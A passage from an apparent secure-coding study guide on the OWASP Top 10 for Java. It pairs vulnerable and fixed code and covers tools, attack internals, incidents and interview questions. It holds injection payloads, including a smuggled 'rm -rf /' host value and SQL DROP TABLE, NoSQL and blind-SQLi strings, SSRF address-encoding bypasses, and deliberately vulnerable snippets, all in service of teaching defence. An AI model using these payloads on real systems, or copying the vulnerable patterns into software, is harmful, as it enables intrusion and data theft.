| **cosign** (Sigstore) | Artifact signing/verify | `cosign sign` / `verify` | Supply-chain integrity (A08). |

### 4.5 Static/dynamic testing & runtime defense

| Tool | Category | What it does |
|---|---|---|
| **SAST** (SpotBugs+**Find-Sec-Bugs**, Semgrep, SonarQube, CodeQL) | Static analysis | Scans source/bytecode for vuln patterns (taint flow to sinks). |
| **DAST** (**OWASP ZAP**, Burp Suite) | Dynamic analysis | Attacks a running app (active/passive scan, fuzzing). |
| **IAST** | Interactive | Instruments runtime to find vulns during functional tests. |
| **WAF** (ModSecurity + OWASP **CRS**, cloud WAFs) | Runtime filter | Blocks known attack patterns at the edge. *Defense-in-depth, not a fix.* |
| **RASP** | Runtime protection | In-app agent blocks exploitation at runtime. |
| **sqlmap** | Offensive | Automated SQLi exploitation (use for testing your own apps). |
| **ysoserial** | Offensive | Generates Java deserialization gadget payloads (for testing). |

> **OWASP CRS** = Core Rule Set, the default rule pack for ModSecurity WAFs covering Top-10-style patterns.

### 4.6 XML parser hardening (XXE, under A05)

| Parser / flag | Setting to disable XXE | Effect |
|---|---|---|
| `DocumentBuilderFactory` | `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)` | Best: forbid DOCTYPE entirely. |
| `DocumentBuilderFactory` | `setFeature("http://xml.org/sax/features/external-general-entities", false)` and `...external-parameter-entities` | Disable external entities. |
| `DocumentBuilderFactory` | `setXIncludeAware(false)`, `setExpandEntityReferences(false)` | Reduce surface. |
| `XMLInputFactory` (StAX) | `setProperty(XMLInputFactory.SUPPORT_DTD, false)` | Disable DTDs. |
| `SAXParserFactory`, `TransformerFactory` | same disallow-doctype / `ACCESS_EXTERNAL_DTD=""` | Apply everywhere XML is parsed. |

### 4.7 Deserialization hardening (A08)

| API | Purpose | Notes |
|---|---|---|
| `java.io.ObjectInputFilter` (JDK 9+) | Allowlist classes for `ObjectInputStream` | `ObjectInputFilter.Config.createFilter("com.acme.*;!*")` |
| `ObjectInputStream.setObjectInputFilter` | Per-stream filter | Apply before reading. |
| Jackson `activateDefaultTyping` | **Danger** — polymorphic typing enables gadget classes | Avoid; if needed, use `PolymorphicTypeValidator` allowlist. |
| Prefer JSON/protobuf data formats | — | Don't native-deserialize untrusted bytes at all. |

---

## 5. Code examples by use case

All examples are Java unless noted. Each shows **vulnerable → fixed** so the contrast is concrete. Non-obvious lines are commented.

### 5.1 A03 SQL injection — JDBC parameterization

```java
// ❌ VULNERABLE: user input concatenated into SQL → SQLi
public User findUserUnsafe(Connection conn, String username) throws SQLException {
    String sql = "SELECT id, email FROM users WHERE username = '" + username + "'";
    // input "x' OR '1'='1" returns all rows; "x'; DROP TABLE users;--" is catastrophic
    try (Statement st = conn.createStatement();
         ResultSet rs = st.executeQuery(sql)) {
        return rs.next() ? new User(rs.getLong("id"), rs.getString("email")) : null;
    }
}

// ✅ FIXED: PreparedStatement — query template and data travel on separate channels
public User findUserSafe(Connection conn, String username) throws SQLException {
    String sql = "SELECT id, email FROM users WHERE username = ?"; // ? is a bind placeholder
    try (PreparedStatement ps = conn.prepareStatement(sql)) {
        ps.setString(1, username);          // driver binds data; it can NEVER be parsed as SQL code
        try (ResultSet rs = ps.executeQuery()) {
            return rs.next() ? new User(rs.getLong("id"), rs.getString("email")) : null;
        }
    }
}
```

**Dynamic identifier (can't be a bind param) — use an allowlist:**

```java
// Sort column comes from user; column NAMES cannot be parameterized → allowlist it
private static final Set<String> SORTABLE = Set.of("created_at", "email", "username");

public String safeOrderBy(String requested) {
    if (!SORTABLE.contains(requested)) {
        throw new IllegalArgumentException("Invalid sort column"); // deny by default
    }
    return requested; // now safe to interpolate because it's from a fixed allowlist
}
```

### 5.2 A03 OS command injection — ProcessBuilder without a shell

```java
// ❌ VULNERABLE: shell interpolation; host="8.8.8.8; rm -rf /" → command injection
public String pingUnsafe(String host) throws IOException {
    Process p = Runtime.getRuntime().exec("sh -c \"ping -c 1 " + host + "\"");
    return new String(p.getInputStream().readAllBytes());
}

// ✅ FIXED: no shell; args passed as a list (no metacharacter parsing) + input validation
private static final Pattern HOSTNAME = Pattern.compile("^[A-Za-z0-9.-]{1,253}$");

public String pingSafe(String host) throws IOException, InterruptedException {
    if (!HOSTNAME.matcher(host).matches()) {        // allowlist validation at the boundary
        throw new IllegalArgumentException("Invalid host");
    }
    ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", host); // argv array, no shell
    pb.redirectErrorStream(true);
    Process p = pb.start();
    String out = new String(p.getInputStream().readAllBytes());
    p.waitFor();
    return out;
}
```

### 5.3 A03 NoSQL injection — MongoDB operator injection

```java
// ❌ VULNERABLE: raw user-supplied object used as a query filter
// If body is {"username":"admin","password":{"$ne":null}} the $ne matches any password
Document filter = Document.parse(rawJsonRequestBody);
Document user = collection.find(filter).first();

// ✅ FIXED: build the query yourself with typed, validated values — operators can't be injected
String username = req.getString("username");
String password = req.getString("password");
if (username == null || password == null) throw new BadRequestException();
Document safe = new Document("username", username)        // value treated as a literal string
        .append("passwordHash", hash(password));         // never accept client operators
Document user = collection.find(safe).first();
```

### 5.4 A01 Broken Access Control / IDOR-BOLA — object-level authZ

```java
// ❌ VULNERABLE: returns any invoice by id; AuthN checked, AuthZ missing → IDOR/BOLA
@GetMapping("/api/invoices/{id}")
public InvoiceDto getInvoice(@PathVariable long id) {
    return invoiceRepo.findById(id).map(InvoiceDto::from).orElseThrow();
    // attacker increments id to read other tenants' invoices
}

// ✅ FIXED #1: scope the QUERY to the authenticated principal — mismatch returns "not found"
@GetMapping("/api/invoices/{id}")
public InvoiceDto getInvoiceSafe(@PathVariable long id, @AuthenticationPrincipal AppUser me) {
    // owner_id derived from the SERVER-SIDE identity, never from the request
    return invoiceRepo.findByIdAndOwnerId(id, me.getId())
            .map(InvoiceDto::from)
            .orElseThrow(() -> new ResponseStatusException(HttpStatus.NOT_FOUND)); // don't leak existence
}

// ✅ FIXED #2: declarative method-level check (use when you must load then authorize)
@PreAuthorize("@invoiceGuard.isOwner(#id, authentication.name)") // central, testable policy
@GetMapping("/api/invoices/{id}")
public InvoiceDto getInvoiceGuarded(@PathVariable long id) { ... }
```

```java
@Component("invoiceGuard")
public class InvoiceGuard {
    private final InvoiceRepository repo;
    public InvoiceGuard(InvoiceRepository repo) { this.repo = repo; }
    public boolean isOwner(long invoiceId, String username) {
        return repo.findById(invoiceId)
                   .map(inv -> inv.getOwnerUsername().equals(username))
                   .orElse(false); // deny by default if not found
    }
}
```

### 5.5 A02 Cryptographic Failures — password hashing & AES-GCM

```java
// ❌ VULNERABLE: fast, unsalted hash → trivially cracked from a DB dump
String stored = sha256Hex(password); // billions of guesses/sec on a GPU

// ✅ FIXED: Argon2id via Spring Security (memory-hard, salted, slow by design)
PasswordEncoder enc = new Argon2PasswordEncoder(
        16,    // salt length (bytes)
        32,    // hash length (bytes)
        1,     // parallelism
        1 << 14, // memory in KiB (16 MiB) — tune up to slow attackers; measure on your hardware
        3);    // iterations
String hash = enc.encode(password);          // stores salt+params inside the encoded string
boolean ok  = enc.matches(password, hash);   // constant-time-ish comparison handled internally
```

```java
// ✅ AES-256-GCM authenticated encryption (confidentiality + integrity)
public byte[] encrypt(byte[] plaintext, SecretKey key) throws GeneralSecurityException {
    byte[] iv = new byte[12];                     // GCM standard IV size
    SecureRandom.getInstanceStrong().nextBytes(iv); // CSPRNG — never java.util.Random
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(Cipher.ENCRYPT_MODE, key, new GCMParameterSpec(128, iv)); // 128-bit auth tag
    byte[] ct = c.doFinal(plaintext);
    return ByteBuffer.allocate(iv.length + ct.length).put(iv).put(ct).array(); // prepend IV
    // CRITICAL: never reuse (key, iv); a repeated nonce in GCM is catastrophic
}
```

### 5.6 A07 AuthN — JWT validation done right (and the `alg:none` trap)

```java
// ❌ VULNERABLE: trusting the token's own 'alg' header → attacker sets alg:none, drops signature
// (Some old libs verified with whatever algorithm the TOKEN claimed.)

// ✅ FIXED: pin the expected algorithm + verify signature, exp, iss, aud (java-jwt example)
Algorithm algorithm = Algorithm.HMAC256(serverSecret); // server decides the algorithm, not the token
JWTVerifier verifier = JWT.require(algorithm)
        .withIssuer("https://auth.acme.com")   // validate issuer
        .withAudience("api://orders")          // validate intended audience
        .acceptLeeway(5)                       // small clock-skew allowance (seconds)
        .build();
DecodedJWT jwt = verifier.verify(token);       // throws on bad sig / expired / wrong iss-aud
String userId = jwt.getSubject();
```

In Spring Boot, prefer letting the resource-server stack do this:

```yaml
# application.yml — Spring validates signature/exp/iss against the IdP's JWKS automatically
spring:
  security:
    oauth2:
      resourceserver:
        jwt:
          issuer-uri: https://auth.acme.com
          audiences: api://orders
```

### 5.7 A10 SSRF — validating an outbound URL

```java
// ❌ VULNERABLE: fetches any user-supplied URL → SSRF to 169.254.169.254 / localhost / internal
public byte[] fetchUnsafe(String url) throws IOException {
    return new URL(url).openStream().readAllBytes();
}

// ✅ FIXED: allowlist scheme, resolve+validate IP (block private/link-local), disable redirects
private static final Set<String> SCHEMES = Set.of("http", "https");

public byte[] fetchSafe(String rawUrl) throws IOException {
    URI uri = URI.create(rawUrl);
    if (!SCHEMES.contains(uri.getScheme())) throw new SecurityException("scheme");
    InetAddress addr = InetAddress.getByName(uri.getHost()); // resolve now
    if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
            || addr.isSiteLocalAddress() || addr.isAnyLocalAddress()
            || isMetadataIp(addr)) {                          // 169.254.169.254 etc.
        throw new SecurityException("blocked destination");
    }
    HttpURLConnection con = (HttpURLConnection) uri.toURL().openConnection();
    con.setInstanceFollowRedirects(false); // a redirect could bounce you to an internal IP
    con.setConnectTimeout(3000); con.setReadTimeout(3000);
    // NOTE: to fully beat DNS rebinding (TOCTOU), pin the resolved IP and connect to it directly,
    // or use an egress proxy/firewall that enforces the allowlist at connection time.
    try (InputStream in = con.getInputStream()) { return in.readAllBytes(); }
}
private boolean isMetadataIp(InetAddress a) {
    return "169.254.169.254".equals(a.getHostAddress());
}
```

### 5.8 A08 Insecure Deserialization — allowlist filter

```java
// ❌ VULNERABLE: deserializing attacker-controlled bytes → gadget-chain RCE (e.g. via ysoserial)
Object obj = new ObjectInputStream(untrustedBytes).readObject();

// ✅ FIXED (if you truly must use native serialization): allowlist classes (JDK 9+)
ObjectInputStream ois = new ObjectInputStream(untrustedBytes);
ois.setObjectInputFilter(
    ObjectInputFilter.Config.createFilter(
        "com.acme.dto.*;java.lang.*;java.util.*;!*")); // allow only these; reject everything else
Object obj = ois.readObject();

// ✅ BETTER: don't native-deserialize untrusted data at all — use JSON with strict typing
ObjectMapper mapper = JsonMapper.builder()
        .disable(MapperFeature.AUTO_DETECT_CREATORS) // example hardening
        .build();
OrderDto dto = mapper.readValue(untrustedJson, OrderDto.class); // bind to a known, safe type
// NEVER call activateDefaultTyping() on untrusted input — that re-enables gadget classes
```

### 5.9 A05 Misconfiguration — XXE-safe XML parsing & security headers

```java
// ✅ XXE-safe DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true); // best: no DOCTYPE
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
Document doc = dbf.newDocumentBuilder().parse(input);
```

```java
// ✅ Security headers + deny-by-default authZ (Spring Security 6)
@Bean
SecurityFilterChain chain(HttpSecurity http) throws Exception {
    http
      .authorizeHttpRequests(a -> a
          .requestMatchers("/actuator/health", "/login").permitAll()
          .anyRequest().authenticated())          // deny by default for everything else
      .headers(h -> h
          .contentSecurityPolicy(c -> c.policyDirectives("default-src 'self'"))
          .httpStrictTransportSecurity(s -> s.includeSubDomains(true).maxAgeInSeconds(31536000))
          .frameOptions(f -> f.deny()))           // anti-clickjacking
      .sessionManagement(s -> s.sessionFixation(f -> f.changeSessionId())); // anti-fixation
    return http.build();
}
```

### 5.10 A09 Logging — log security events, never secrets

```java
private static final Logger log = LoggerFactory.getLogger(AuthController.class);

void onLoginFailure(String username, HttpServletRequest req) {
    // ✅ Log security-relevant event WITH context, WITHOUT the password
    log.warn("auth_login_failed user={} ip={} reqId={} ua=\"{}\"",
            mask(username), clientIp(req), MDC.get("reqId"), req.getHeader("User-Agent"));
    // ❌ NEVER: log.info("login attempt {}:{}", username, password); // leaks credentials
}
// mask() partially redacts PII; centralize to a SIEM; alert when failures/min exceed a threshold
```

### 5.11 A06 — Dependency-Check in Maven (fail the build on critical)

```xml
<plugin>
  <groupId>org.owasp</groupId>
  <artifactId>dependency-check-maven</artifactId>
  <version>9.x</version> <!-- version-specific; pin in real builds -->
  <configuration>
    <failBuildOnCVSS>7.0</failBuildOnCVSS> <!-- fail on High+ (7.0–10.0) -->
    <formats><format>HTML</format><format>SARIF</format></formats>
  </configuration>
  <executions><execution><goals><goal>check</goal></goals></execution></executions>
</plugin>
```

```bash
# Run in CI; it downloads/caches the NVD data feed then scans the dependency tree
mvn org.owasp:dependency-check-maven:check
# Generate a CycloneDX SBOM alongside:
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

---

## 6. Implementation concerns & best practices

### 6.1 Performance

- **Prepared statements** are *faster*, not slower (server-side plan caching) — security and performance align here.
- **Password KDFs are intentionally slow**; tune cost so a single hash takes ~50–250 ms on *your* hardware. Too low = crackable; too high = a login-throughput DoS vector. Benchmark; don't copy a number blindly.
- **Argon2 memory cost** (e.g., 16–64 MiB) multiplied by concurrent logins can pressure heap — size accordingly.
- **TLS** has near-negligible CPU cost on modern hardware (AES-NI); always-on TLS is the default.
- **WAF/RASP** add latency and can become bottlenecks; place at the edge and tune rules.
- **SSRF IP re-validation** and SCA scans add build/runtime cost; cache NVD data and parallelize.

### 6.2 Correctness & concurrency

- **AuthZ must be evaluated server-side on every request** — never cache an authZ decision across a privilege change without invalidation.
- **TOCTOU** (Time-Of-Check-To-Time-Of-Use) bugs: validate-then-use races (the SSRF DNS-rebinding case; file checks before open). Re-check at use, or operate on a resolved/pinned reference.
- **Nonce/IV uniqueness** under concurrency: a shared counter must be atomic; prefer random 96-bit IVs with `SecureRandom`.
- **Constant-time comparison** for secrets/tokens (`MessageDigest.isEqual`, not `String.equals`) to avoid timing side-channels.

### 6.3 Security (cross-cutting principles)

- **Deny by default**; **validate at the boundary, encode/parameterize at the sink**; **least privilege** for every account (DB user per service, read-only where possible); **fail securely**; **don't trust the client** (price, role, ownership all server-derived).
- **Defense in depth**: one control per seam, independent layers.
- **Minimize attack surface**: remove unused endpoints/features/deps.

### 6.4 Observability

- Emit **structured, correlated** logs for security events; centralize to a SIEM; set **alert thresholds** (auth failures/min, authZ denials, 5xx spikes, egress anomalies).
- Track security **metrics/SLOs**: % critical vulns patched within SLA, mean time to detect/respond, % endpoints with authZ tests.
- **Redact secrets/PII** in logs and traces.

### 6.5 Cost

- SCA/SAST/DAST tooling and KMS/HSM usage carry licensing/usage costs; weigh against breach cost. A single breach (regulatory fines, notification, reputational loss) dwarfs tooling cost — the Capital One breach incurred ~$190M+ in settlements/fines.

### 6.6 Testing

- **Unit-test authZ**: for each protected resource, assert that *another* user gets 403/404. This is the single highest-ROI security test (covers A01).
- **SAST in CI** (Find-Sec-Bugs/Semgrep/CodeQL) for injection/crypto patterns.
- **DAST** (OWASP ZAP baseline scan) against staging.
- **SCA gate** failing the build on High/Critical.
- **Negative tests**: malformed input, oversized payloads, injection strings (sqlmap against your own app), deserialization payloads (ysoserial), SSRF targets.
- Map tests to **ASVS** requirements for systematic coverage.

### 6.7 Production hardening checklist

- TLS-only, HSTS, modern cipher suites; security headers (CSP, X-Content-Type-Options, frame-deny).
- No default creds; Actuator/management endpoints locked down or on a separate port/network.
- Generic error pages; stack traces only in logs.
- Least-privilege IAM/DB roles; secrets in a vault/KMS, never in env-dumped config or source.
- Egress firewall + IMDSv2 (anti-SSRF) for cloud workloads.
- Centralized logging + alerting + IR runbook.
- Automated patch SLA with SCA gating.

### 6.8 Anti-patterns to avoid

| Anti-pattern | Why it's wrong | Do instead |
|---|---|---|
| Blocklist input filtering for injection | Bypassable; arms race | Parameterize/encode at the sink |
| Client-side authZ only | Attacker talks to API directly | Server-side authZ on every request |
| Sequential IDs as "security" | Doesn't authorize anything | Scope queries to the principal |
| Fast/unsalted password hash | GPU-crackable | Argon2id/bcrypt + salt |
| `java.util.Random` for tokens | Predictable | `SecureRandom` |
| Native deserialization of untrusted bytes | RCE via gadgets | JSON to known types / allowlist filter |
| `Access-Control-Allow-Origin: *` with credentials | Leaks data cross-origin | Explicit origin allowlist |
| Verbose error messages in prod | Info leak | Generic errors; details in logs |
| Logging passwords/tokens/PAN | Secret leak + compliance breach | Redact/mask |
| "We'll add security later" | Insecure design baked in | Threat model at design time |
| Trusting JWT `alg` header | `alg:none` / algorithm confusion | Pin expected algorithm; verify sig |
| `activateDefaultTyping()` on untrusted JSON | Re-enables gadget RCE | Bind to concrete types; PolymorphicTypeValidator |

---

## 7. Advanced topics & deep internals

### 7.1 How the 2021 list is actually built (methodology)

OWASP collects two data points per CWE from contributors across ~500k apps: **incidence rate** (% of apps tested that had at least one instance — chosen over raw frequency to avoid bias toward easily-found bugs) and supporting **exploitability/impact** scores from CVE/CVSS data mapped to the category's CWEs. Eight categories are data-driven; **two are chosen from a community survey** to capture forward-looking risks not yet well represented in data (in 2021: Insecure Design and SSRF). Each category is a *group of CWEs* with an average exploit/impact weighting. This is why ranks shift and categories merge across editions.

### 7.2 Blind & out-of-band SQLi internals

When the app returns no query output, attackers extract data **one bit at a time**:
- **Boolean-based blind:** `... AND SUBSTRING(password,1,1)='a'` — page differs (true vs false) → infer each character.
- **Time-based blind:** `... AND IF(SUBSTRING(...)='a', SLEEP(5), 0)` — response delay encodes the answer; works even with identical pages.
- **Out-of-band:** force the DB to make a DNS/HTTP request encoding stolen data (`xp_dirtree`, `UTL_HTTP`, `LOAD_FILE`) — exfiltrates even when no in-band channel exists. **sqlmap** automates all of these.

### 7.3 JWT attack surface (deep)

- **`alg:none`** — token claims no signature; naive verifiers accept it. *Fix: reject `none`; pin algorithm.*
- **Algorithm confusion (RS256→HS256)** — server expects RSA (verify with public key); attacker switches to HMAC and signs with the *public key as the HMAC secret*. *Fix: bind the verification key to a fixed algorithm.*
- **`kid` injection / JWKS spoofing** — manipulating the key-id header to point at an attacker key or a path-traversal target. *Fix: validate `kid` against known keys only.*
- **No `exp`/long lifetime + no revocation** — stolen tokens valid forever. *Fix: short lifetimes, refresh-token rotation, denylist on logout/compromise.*
- **Sensitive data in the (base64, not encrypted) payload** — JWT is *signed, not secret*. Don't put secrets in claims.

### 7.4 Deserialization gadget chains (deep)

A **gadget** is a class already on your classpath whose deserialization callback (`readObject`, `readResolve`, finalizers, or property setters invoked during reconstruction) performs an action with a useful side effect. A **gadget chain** strings these together so a controlled object graph, when deserialized, ends at a sink like `Runtime.exec` or a `TemplatesImpl` that loads bytecode. **ysoserial** ships chains for Commons-Collections, Spring, Groovy, Hibernate, etc. The vulnerability is *not* in the serializer per se — it's that deserialization grants the attacker the power to *instantiate arbitrary types and trigger their callbacks*. This is why allowlisting types (`ObjectInputFilter`) is the surgical control, and avoiding native deserialization entirely is the strategic one.

### 7.5 SSRF bypasses & IMDSv2 internals

- **DNS rebinding (TOCTOU):** attacker's domain resolves to a public IP during your validation, then to `169.254.169.254` (TTL=0) during the actual fetch. *Defense: resolve once, pin the IP, connect to that IP; or enforce at an egress proxy.*
- **Alternate encodings:** `http://2130706433/` (decimal for 127.0.0.1), `http://0x7f.0.0.1/`, IPv6 `[::ffff:169.254.169.254]`. *Defense: parse to a canonical `InetAddress` and validate the binary address, not the string.*
- **Open redirects & redirect following:** validate target but follow a 302 to an internal host. *Defense: disable redirects or re-validate each hop.*
- **IMDSv2 (AWS):** v1 metadata was a simple GET (easy SSRF target). **IMDSv2** requires a `PUT` to obtain a session token (with `X-aws-ec2-metadata-token-ttl-seconds`) then a `GET` carrying that token, and sets a default TTL/hop limit so the request can't be made by a simple SSRF or proxied off-host. Enforce `HttpTokens=required`. This structurally defeats most metadata-SSRF.

### 7.6 Cryptographic edge cases

- **GCM nonce reuse** with the same key is catastrophic: it leaks the authentication subkey and XOR of plaintexts → forgery + plaintext recovery. With random 96-bit IVs, after ~2^32 messages per key the collision probability becomes non-negligible — **rotate keys**.
- **Padding oracle** (CBC mode + error differentiation) lets attackers decrypt ciphertext without the key. *Avoid CBC; use AEAD.*
- **ECB mode** encrypts identical blocks identically → leaks structure (the infamous "ECB penguin"). Never use ECB.
- **Timing attacks** on `equals` comparisons of MACs/tokens → use constant-time comparison.
- **Weak RNG seeding** (predictable `SecureRandom` on some constrained/early-boot systems) → entropy starvation; prefer `getInstanceStrong()` for long-lived keys, accept its potential blocking.

### 7.7 Lesser-known A01 behaviors

- **Mass assignment / over-posting** — binding a request body directly to an entity lets an attacker set fields they shouldn't (`isAdmin=true`). *Fix: bind to a DTO with only allowed fields.* (Also API6.)
- **CORS with credentials + reflected origin** — reflecting the `Origin` header into `Access-Control-Allow-Origin` *with* `Allow-Credentials: true` lets any site read authenticated responses.
- **Force-browsing / referer-based authZ** — relying on the Referer header or "you got here from the right page" is not authorization.

---

## 8. Tradeoffs & decision frameworks

### 8.1 Web Top 10 (2021) vs API Security Top 10 (2023)

The API list exists because API-specific risks (object/property/function-level authZ, unrestricted resource consumption, business-flow abuse) are under-represented in the web list. Backend/microservice teams must consult **both**.

| API 2023 | Maps to / relates to Web 2021 | Distinct emphasis |
|---|---|---|
| API1 **Broken Object Level Authorization (BOLA)** | A01 | Per-object authZ — the #1 API risk |
| API2 **Broken Authentication** | A07 | Token/credential handling for machine clients |
| API3 **Broken Object Property Level Authorization** | A01 (mass assignment + excessive data exposure) | Returning/accepting fields you shouldn't |
| API4 **Unrestricted Resource Consumption** | A04 | No rate/size/cost limits → DoS/$ abuse |
| API5 **Broken Function Level Authorization (BFLA)** | A01 | Calling admin functions as a normal user |
| API6 **Unrestricted Access to Sensitive Business Flows** | A04 | Automation abuse of legit flows (scalping) |
| API7 **SSRF** | A10 | Same risk, API context |
| API8 **Security Misconfiguration** | A05 | Same |
| API9 **Improper Inventory Management** | A09/A06 | Shadow/zombie APIs, undocumented versions |
| API10 **Unsafe Consumption of APIs** | A08/A10 | Trusting third-party API responses too much |

### 8.2 SAST vs DAST vs IAST vs SCA vs RASP/WAF

| Approach | Sees | Strengths | Blind spots | Use when |
|---|---|---|---|---|
| **SAST** | Source/bytecode | Early, full coverage, line-level | False positives; misses runtime/config; weak on authZ logic | In IDE & CI for injection/crypto |
| **DAST** | Running app (black-box) | Real exploitability; finds config issues | Needs running app; coverage gaps; late | Staging scans, pre-release |
| **IAST** | Instrumented runtime | Accurate, low FP | Needs test traffic; agent overhead | During QA/functional tests |
| **SCA** | Dependencies | Finds known-CVE components | Only known vulns; CPE noise | Every build (A06/A08) |
| **WAF/RASP** | Runtime traffic/exec | Buys time, virtual patching | Bypassable; not a fix | Defense-in-depth at edge/app |

**Rule:** combine — SAST+SCA in CI (shift left), DAST/IAST pre-prod, WAF/RASP in prod. None alone is sufficient, especially for **A01 (authZ)**, which mostly requires **human review + targeted tests**.

### 8.3 Password storage algorithm choice

| Algorithm | Type | Memory-hard? | OWASP guidance | Use when |
|---|---|---|---|---|
| **Argon2id** | KDF | Yes | **First choice** | Default for new systems |
| **scrypt** | KDF | Yes | Good alternative | Argon2 unavailable |
| **bcrypt** | KDF | No (CPU) | Acceptable; cost ≥10–12; 72-byte input cap | Mature ecosystems |
| **PBKDF2** | KDF | No | Use only if FIPS required; high iterations | FIPS/compliance |
| SHA-256/MD5 (raw) | Hash | No | **Never** for passwords | — |

### 8.4 Session vs JWT

| | Server sessions | JWT (stateless) |
|---|---|---|
| State | Server-side | In token |
| Revocation | Instant | Hard (needs denylist/short TTL) |
| Scalability | Needs shared store | Trivial horizontal scale |
| Size on wire | Small (id) | Larger |
| Best for | Web apps needing instant logout | Distributed APIs/microservices |

**Use sessions when** you need instant revocation and have a session store; **use JWT when** you need stateless, cross-service auth — but pair with short lifetimes + refresh rotation.

### 8.5 "Use when / avoid when" quick rules

- **Use parameterized queries** always; **avoid** dynamic SQL string-building — if forced (identifiers), allowlist.
- **Use AEAD (AES-GCM/ChaCha20-Poly1305)**; **avoid** ECB/CBC and homegrown crypto.
- **Use object-scoped queries + server-derived identity** for authZ; **avoid** trusting any client-supplied owner/role/price.
- **Use allowlists** for SSRF destinations and deserialization types; **avoid** blocklists.
- **Use a WAF** as a delay/virtual-patch layer; **avoid** treating it as the fix.

---

## 9. Failure modes & debugging

### 9.1 What breaks in production (and how to diagnose)

| Symptom | Likely category | Diagnosis tools/commands |
|---|---|---|
| Users see others' data; bulk-export anomalies | A01 IDOR/BOLA | Audit logs for one principal hitting many object ids; replay tests with two accounts; review query scoping |
| Sudden DB load / weird query errors / data exfil | A03 SQLi | DB query logs, WAF alerts, `sqlmap` reproduction on staging; grep code for string-concat SQL |
| Cracked credentials reused elsewhere | A02/A07 | Check hash algorithm in DB; breached-password alerts; failed-login spikes |
| RCE / unexpected outbound connections from app host | A06 (Log4Shell) / A08 (deser) | `jcmd`/heap dump, classpath audit (`mvn dependency:tree`), egress logs; SCA scan for vulnerable jar versions |
| App fetching `169.254.169.254` / internal hosts | A10 SSRF | Egress/proxy logs; review URL-fetch features; check IMDSv2 enforcement |
| Public bucket / exposed Actuator `/env`,`/heapdump` | A05 | Cloud posture scan; `curl` the management endpoints; config review |
| "We found out from a third party" | A09 | Logging/alerting coverage audit; tabletop IR exercise |

### 9.2 Concrete investigation commands

```bash
# A06: what version of log4j / any dependency is actually on the classpath?
mvn dependency:tree | grep -i log4j
grype dir:.            # or: trivy fs .         — scan for known-vuln components
# A03/A10: spot outbound connections the app should not be making
ss -tnp | grep java    # active sockets by the JVM process
# A08: confirm a deserialization filter is active (JDK 9+ global)
java -Djdk.serialFilter='com.acme.*;!*' -jar app.jar
# A05: probe for exposed management endpoints
curl -s http://localhost:8080/actuator/env | head
# A03: safely test your OWN endpoint for SQLi
sqlmap -u "https://staging.acme.com/api/search?q=test" --batch
```

### 9.3 Real-world incidents (study these)

- **Equifax (2017)** — A06: an unpatched **Apache Struts** RCE (CVE-2017-5638, an OGNL expression-injection flaw) exposed ~147M people's data. Root cause: known-vulnerable component left unpatched + poor segmentation + missed detection (A06 + A09).
- **Capital One (2019)** — A10 SSRF: a misconfigured WAF allowed SSRF to the EC2 metadata service, leaking IAM creds → ~100M records from S3. Root cause: SSRF + over-privileged role + IMDSv1.
- **Log4Shell (CVE-2021-44228, 2021)** — A06/A08: JNDI lookup in a logging library → unauthenticated RCE across the Java ecosystem. Lesson: transitive dependencies are part of your attack surface; logged input is untrusted input.
- **SolarWinds (2020)** — A08: compromised **build pipeline** shipped a signed-but-backdoored update to ~18,000 orgs. Lesson: supply-chain/build integrity is a first-class risk.
- **Optus / many telco breaches** — A01: unauthenticated/IDOR API endpoints enabling mass data scraping. Lesson: object-level authZ on every endpoint.

### 9.4 Incident-response loop (when a Top-10 bug is exploited)

1. **Detect** (alert/third-party report). 2. **Contain** (revoke creds/tokens, block IPs, virtual-patch via WAF, rotate keys). 3. **Eradicate** (patch the actual code/dependency/config). 4. **Recover** (restore, force password resets). 5. **Post-mortem** (root cause → map to Top-10 category → add a regression test + control so it can't recur). Logging quality (A09) determines how fast steps 1–3 go.

---

## 10. Interview drill

**Q1. Why did Broken Access Control move to #1 in 2021, and how do you prevent IDOR/BOLA?**
Model answer: It had the highest *incidence rate* in contributed data and high impact — most apps had at least one access-control weakness. Prevent IDOR/BOLA by enforcing **object-level authorization server-side on every data access**, deriving owner/tenant scope from the **authenticated principal**, e.g. `WHERE id=:id AND owner_id=:me` so a mismatch yields "not found"; centralize the check; deny by default; add tenant isolation.
- *Follow-up: Why not just use UUIDs?* UUIDs slow enumeration but don't *authorize* — you still need the check. Obscurity ≠ access control.
- *Follow-up: 403 vs 404 for someone else's object?* Returning 404 (or empty) avoids leaking existence; choose deliberately per threat model.
- *Follow-up: How do you test it?* For each protected resource, an automated test asserting a *second* user gets denied.

**Q2. Explain SQL injection and why input sanitization isn't the right fix.**
Model: SQLi mixes attacker data into a query string so it's parsed as code. Sanitization/escaping is an unwinnable arms race (encodings, comment variants, second-order). The fix is **parameterized queries** — the driver sends template and data on separate channels so data can't be code. For identifiers (not parameterizable), use a strict allowlist.
- *Follow-up: Blind SQLi?* No output channel; extract data via boolean (page diff) or time-based (`SLEEP`) inference; out-of-band via DNS.
- *Follow-up: ORM immunity?* No — `createNativeQuery`/HQL with string concat is still injectable; use bound parameters.

**Q3. Distinguish authentication and authorization, and name the Top-10 categories for each.**
Model: AuthN = proving identity (A07 Identification & Authentication Failures); AuthZ = what you're allowed to do (A01 Broken Access Control). They fail independently — a valid token (AuthN ok) with a missing object check (AuthZ fail) is BOLA.
- *Follow-up: Where do JWTs fit?* AuthN/session mechanism; pitfalls (`alg:none`, no `exp`) are A07.

**Q4. What was Log4Shell and what general lesson does it teach?**
Model: CVE-2021-44228 — Log4j2 resolved JNDI lookups inside logged strings, so a crafted string anywhere in logs caused the server to load and run remote code (unauthenticated RCE, CVSS 10). Maps to A06/A08. Lessons: maintain an SBOM, SCA-gate builds, patch fast; treat all logged data as untrusted; transitive deps are attack surface.
- *Follow-up: What's JNDI?* Java API to look up objects by name via LDAP/RMI; the lookup fetched and instantiated a remote class.
- *Follow-up: Immediate mitigation before patching?* Remove the JndiLookup class / set the disable flag / WAF rule — virtual patch, then upgrade.

**Q5. How do you store passwords correctly, and why are MD5/SHA-256 wrong?**
